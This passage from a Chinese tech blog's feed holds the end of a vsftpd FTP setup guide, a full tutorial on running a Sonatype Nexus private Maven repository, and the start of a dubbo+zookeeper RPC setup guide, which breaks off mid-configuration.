<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 允许匿名用户登录</span><br><span class="line">anonymous_enable=YES</span><br><span class="line"># 匿名登录不需要密码（可选）</span><br><span class="line">no_anon_password=YES</span><br><span class="line"># 匿名登录的最大传输速率，Bytes/second（可选）</span><br><span class="line">anon_max_rate=30000</span><br><span class="line"># 匿名登录的目录（可选）</span><br><span class="line">anon_root=/example/directory/</span><br></pre></td></tr></table></figure>
<p><strong>根目录限制（Chroot Jail）</strong><br>（ LCTT 译注：chroot jail是类unix系统中的一种安全机制，用于修改进程运行的根目录环境，限制该线程不能感知到其根目录树以外的其他目录结构和文件的存在。详情参看<a href="https://zh.wikipedia.org/wiki/Chroot">chroot jail</a>）</p>
<p>有时我们需要设置根目录（chroot）环境来禁止用户离开他们的家（home）目录。在配置文件中增加/修改下面配置开启根目录限制（Chroot Jail）:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">chroot_list_enable=YES</span><br><span class="line">chroot_list_file=/etc/vsftpd.chroot_list</span><br></pre></td></tr></table></figure>
<p>“chroot_list_file”变量指定根目录限制所包含的文件/目录（ LCTT 译注：即用户只能访问这些文件/目录）</p>
<p>最后你必须重启ftp服务，在命令行中输入以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl restart vsftpd</span><br></pre></td></tr></table></figure>
<p>到此为止，你的ftp服务已经搭建完成并且启动了。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>ftp</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建Maven私服-Nexus</title>
    <url>//build-Maven-Nexus</url>
    <content><![CDATA[<blockquote>
<p>Maven 私服，可以代理远程仓库和部署自己或第三方构件。本文介绍使用最广泛搭建 Maven 私服的工具： Sonatype Nexus。</p>
</blockquote>
<h2 id="作者环境"><a href="#作者环境" class="headerlink" title="作者环境"></a>作者环境</h2><p>  本次搭建私服是在局域网的一台服务器上，操作系统为 CentOS 。<br>  需要部署到私服的项目 <code>soul</code><br>  <code>ssm</code> 项目需要引用 <code>soul</code></p>
<h2 id="安装Java"><a href="#安装Java" class="headerlink" title="安装Java"></a>安装Java</h2><p>  确保服务器已经安装了 java 环境，这个过程不是本文重点，安装过程自行百度。</p>
<h2 id="安装Nexus"><a href="#安装Nexus" class="headerlink" title="安装Nexus"></a>安装Nexus</h2><blockquote>
<p>官网 pro 版本的是需要付费的。所以我们使用免费的 OSS 版本，下载地址 (<a href="https://www.sonatype.com/download-oss-sonatype">https://www.sonatype.com/download-oss-sonatype</a>)</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 上传到服务器并解压</span></span><br><span class="line">$ tar xvf nexus-3.5.1-02-unix.tar.gz</span><br></pre></td></tr></table></figure>

<h3 id="启动Nexus"><a href="#启动Nexus" class="headerlink" title="启动Nexus"></a>启动Nexus</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line">$ <span class="built_in">cd</span> /nexus-3.5.1-02/bin/</span><br><span class="line">$ ./nexus start</span><br></pre></td></tr></table></figure>

<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>打开网址：(<a href="http://192.168.0.86:8081/">http://192.168.0.86:8081/</a>) , ip 为搭建私服的服务器 ip 。<br>用户名/密码： admin/admin123<br>出现一下画面，就说明安装成功了。<br><img src="http://img.saodiyang.com/FkIlJRDdMC2yJFT9huIk9gBuCe15.png" class="lazyload" data-srcset="http://img.saodiyang.com/FkIlJRDdMC2yJFT9huIk9gBuCe15.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="nexus"></p>
<h2 id="发布soul项目到私服"><a href="#发布soul项目到私服" class="headerlink" title="发布soul项目到私服"></a>发布soul项目到私服</h2><h3 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h3><ol>
<li>创建yelog-release仓库（<em>名字自定义</em>）, type选择 ： release<br><img src="http://img.saodiyang.com/Fk5UboZXVf4aegz63N4TDrITMh4V.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fk5UboZXVf4aegz63N4TDrITMh4V.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="①.创建宿主仓库"><br><img src="http://img.saodiyang.com/FjAz8w445FFeVqDDzLLTLitOkZyV.png" class="lazyload" data-srcset="http://img.saodiyang.com/FjAz8w445FFeVqDDzLLTLitOkZyV.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="②.选择hosted类型"><br><img src="http://img.saodiyang.com/Ft2u5UPqdAFxldkkwAC2uVBtjDhF.png" class="lazyload" data-srcset="http://img.saodiyang.com/Ft2u5UPqdAFxldkkwAC2uVBtjDhF.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="③.创建release类型仓库"></li>
<li>创建yelog-snapshot仓库（<em>名字自定义</em>）， type选择 ： snapshot<br>重复上面 ① 和 ② 步，根据下图选择类型:<br><img src="http://img.saodiyang.com/FgX10ufvTV_YUK2vjrdRN3InKN1i.png" class="lazyload" data-srcset="http://img.saodiyang.com/FgX10ufvTV_YUK2vjrdRN3InKN1i.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="创建snapshot类型仓库"></li>
</ol>
<p>两个都创建完成后，效果如下：<br><img src="http://img.saodiyang.com/FjcMrajAM3anymLemHA2OoZZUut-.png" class="lazyload" data-srcset="http://img.saodiyang.com/FjcMrajAM3anymLemHA2OoZZUut-.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="创建自定义release和snapshot仓库"></p>
<h3 id="pom中添加部署配置"><a href="#pom中添加部署配置" class="headerlink" title="pom中添加部署配置"></a>pom中添加部署配置</h3><p>url 复制上图中新建的仓库的 copy 按钮，复制url。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">distributionManagement</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>yelog-release<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Release Repository of yelog<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://192.168.0.86:8081/repository/yelog-release/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">snapshotRepository</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>yelog-snapshot<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Snapshot Repository of yelog<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://192.168.0.86:8081/repository/yelog-snapshot/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">snapshotRepository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">distributionManagement</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="在maven的-settings-xml-中配置"><a href="#在maven的-settings-xml-中配置" class="headerlink" title="在maven的 settings.xml 中配置"></a>在maven的 settings.xml 中配置</h3><p>这里配置 maven 的账号密码，id 要与 distributionManagement 中的id一致。默认账号/密码：admin/admin123</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>yelog-realease<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>yelog-snapshot<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servers</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="执行maven命令部署项目到私服上"><a href="#执行maven命令部署项目到私服上" class="headerlink" title="执行maven命令部署项目到私服上"></a>执行maven命令部署项目到私服上</h3><p>我这里直接使用IDE的插件执行<br><img src="http://img.saodiyang.com/Frs7jSIClJvF31AnyAAz5JXL-IAP.png" class="lazyload" data-srcset="http://img.saodiyang.com/Frs7jSIClJvF31AnyAAz5JXL-IAP.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="部署项目到私服"><br>部署完成后，可以在 yelog-snapshot 仓库中，查看部署的情况，如下图所示<br><img src="http://img.saodiyang.com/Fi1YtOKOAK7KMigjAc4S7ZfwLLjl.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fi1YtOKOAK7KMigjAc4S7ZfwLLjl.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="查看部署情况"></p>
<h2 id="从私服拉去依赖库"><a href="#从私服拉去依赖库" class="headerlink" title="从私服拉去依赖库"></a>从私服拉去依赖库</h2><blockquote>
<p>上一步我们已经将项目 <code>soul</code> 部署到私服上了，这一步介绍项目 <code>ssm</code> 如何依赖引用 <code>soul</code>。<br>私服中的 maven-central 可以链接远程仓库。这样，当有依赖在私服中找不到后，就可以通过远程仓库自动下载依赖。</p>
</blockquote>
<h3 id="pom-文件中添加如下配置"><a href="#pom-文件中添加如下配置" class="headerlink" title="pom 文件中添加如下配置"></a>pom 文件中添加如下配置</h3><ol>
<li>public库成员仓库中添加我们自定义的仓库<br><img src="http://img.saodiyang.com/FlmsId2u1z_vQ__zlfzoAIytujm3.png" class="lazyload" data-srcset="http://img.saodiyang.com/FlmsId2u1z_vQ__zlfzoAIytujm3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="public库设置成员仓库"></li>
<li>配置远程仓库为私服地址。<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>public<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>public Repository<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://192.168.0.86:8081/repository/maven-public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">releases</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">releases</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>public<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Public Repositories<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://192.168.0.86:8081/repository/maven-public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">pluginRepositories</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>引入依赖<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.soul<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>ssm项目就可以引用到soul代码<br><img src="http://img.saodiyang.com/FvVCRBtMwy5ckbase3E3wM9JUXp6.png" class="lazyload" data-srcset="http://img.saodiyang.com/FvVCRBtMwy5ckbase3E3wM9JUXp6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在代码中就可以直接引用到部署到私服的soul项目代码"></li>
</ol>
<p>本文结束。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>maven</tag>
        <tag>nexus</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建dubbo+zookeeper平台</title>
    <url>//%E6%90%AD%E5%BB%BAdubbo+zookeeper%E5%B9%B3%E5%8F%B0</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文将介绍在SpringMVC+Spring+Mybatis项目中添加 <code>dubbo</code> 作为 <code>rpc</code> 服务。</p>
<p>文末有项目代码地址。</p>
<h2 id="一-搭建zookeeper"><a href="#一-搭建zookeeper" class="headerlink" title="一.搭建zookeeper"></a>一.搭建zookeeper</h2><p>使用 docker 一句话创建：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -dit --name zookeeper --hostname zookeeper-host -v /data:/data -p 2181:2181 jplock/zookeeper:latest</span><br></pre></td></tr></table></figure>
<h2 id="二-安装zkui（非必须）"><a href="#二-安装zkui（非必须）" class="headerlink" title="二.安装zkui（非必须）"></a>二.安装zkui（非必须）</h2><p>这个项目为 zookeeper 提供一个 web 的管理界面。当然我们也可以直接在zookeeper中使用命令查看，所以此步骤可以忽略</p>
<p>在开始前需要安装 Java 环境、Maven 环境。</p>
<ol>
<li>到 <a href="https://github.com/DeemOpen/zkui">zkui</a> 的项目中下载代码。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/DeemOpen/zkui.git</span><br></pre></td></tr></table></figure></li>
<li>执行 <code>mvn clean install</code> 生成jar文件。</li>
<li>将config.cfg复制到上一步生成的jar文件所在目录，然后修改配置文件中的zookeeper地址。</li>
<li>执行 <code>nohup java -jar zkui-2.0-SNAPSHOT-jar-with-dependencies.jar &amp;</code></li>
<li>测试 <code>http://localhost:9090</code>，如果能看到如下页面，表示安装成功。</li>
</ol>
<p><img src="http://img.saodiyang.com/Fherw3peRgh-grmGz6qkNri5J1aG.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fherw3peRgh-grmGz6qkNri5J1aG.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="登录页面"><br><img src="http://img.saodiyang.com/FvEVMOzSZBP4N4-Q14noQT_VsKF6.png" class="lazyload" data-srcset="http://img.saodiyang.com/FvEVMOzSZBP4N4-Q14noQT_VsKF6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="首页"></p>
<h2 id="三-使用dubbo"><a href="#三-使用dubbo" class="headerlink" title="三.使用dubbo"></a>三.使用dubbo</h2><ol>
<li>在原来 SpringMVC+Spring+Mybatis 项目中，除了原来 spring 相关依赖外，还需要加入以下依赖<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.101tec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zkclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>定义服务接口<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IPersonService</span> </span>&#123;</span><br><span class="line">    <span class="function">List&lt;Person&gt; <span class="title">listAll</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">Person <span class="title">getById</span><span class="params">(Integer id)</span></span>;</span><br><span class="line">    <span class="function">Integer <span class="title">delById</span><span class="params">(Person person)</span></span>;</span><br><span class="line">    <span class="function">Integer <span class="title">updatePerson</span><span class="params">(Person person)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>定义服务实现类<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonService</span> <span class="keyword">implements</span> <span class="title">IPersonService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    PersonMapper personMapper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Person&gt; <span class="title">listAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> personMapper.findAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Person <span class="title">getById</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> personMapper.findOneById(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">delById</span><span class="params">(Person person)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> personMapper.del(person);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">updatePerson</span><span class="params">(Person person)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> personMapper.update(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>配置生产者，注册服务信息<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:dubbo</span>=<span class="string">&quot;http://code.alibabatech.com/schema/dubbo&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.5.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">	http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--定义了提供方应用信息，用于计算依赖关系；--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:application</span> <span class="attr">name</span>=<span class="string">&quot;demotest-provider&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 使用 zookeeper 注册中心暴露服务地址 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">address</span>=<span class="string">&quot;zookeeper://192.168.0.86:2181&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 用dubbo协议在20880端口暴露服务 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">&quot;dubbo&quot;</span> <span class="attr">port</span>=<span class="string">&quot;20880&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 和本地bean一样实现服务 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;personService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ssm.service.PersonService&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 声明需要暴露的服务接口 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:service</span> <span class="attr">interface</span>=<span class="string">&quot;com.ssm.iservice.IPersonService&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;personService&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>配置消费者，订阅服务<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:dubbo</span>=<span class="string">&quot;http://code.alibabatech.com/schema/dubbo&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.5.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">	http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 消费方应用名，用于计算依赖关系，不是匹配条件，不要与提供方一样 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:application</span> <span class="attr">name</span>=<span class="string">&quot;demo-consumer&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 使用 zookeeper 注册中心暴露发现服务地址 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">address</span>=<span class="string">&quot;zookeeper://192.168.0.86:2181&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 生成远程服务代理，可以和本地bean一样使用demoService --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">id</span>=<span class="string">&quot;personService&quot;</span> <span class="attr">check</span>=<span class="string">&quot;false&quot;</span> <span class="attr">interface</span>=<span 